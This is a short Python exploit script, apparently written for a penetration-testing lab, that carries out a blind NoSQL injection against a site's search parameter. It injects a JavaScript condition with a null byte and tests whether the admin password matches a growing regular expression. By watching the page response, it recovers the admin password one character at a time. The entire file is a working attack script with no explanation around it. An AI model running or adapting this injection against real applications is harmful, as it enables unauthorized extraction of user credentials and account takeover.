import urllib.request
import string

URL='http://ptl-650b2acf-13953987.libcurl.st/'

#this function return True or False
def check(payload):
    url=URL+"?search=admin%27%20%26%26this.password%26%26%20this.password.match(/"+payload+"/)%00"
    print(url)
    #resp = urllib.request.urlopen(url)
    with urllib.request.urlopen(url) as resp:
        data = resp.read()
    return ">admin<" in str(data)

#print(check(".*"))
CHARSET=list("-"+string.ascii_lowercase[0:6]+string.digits)
print(string.ascii_lowercase[0:6])
password = ""
while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password + c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            #exit when you go to finish
            exit(0)

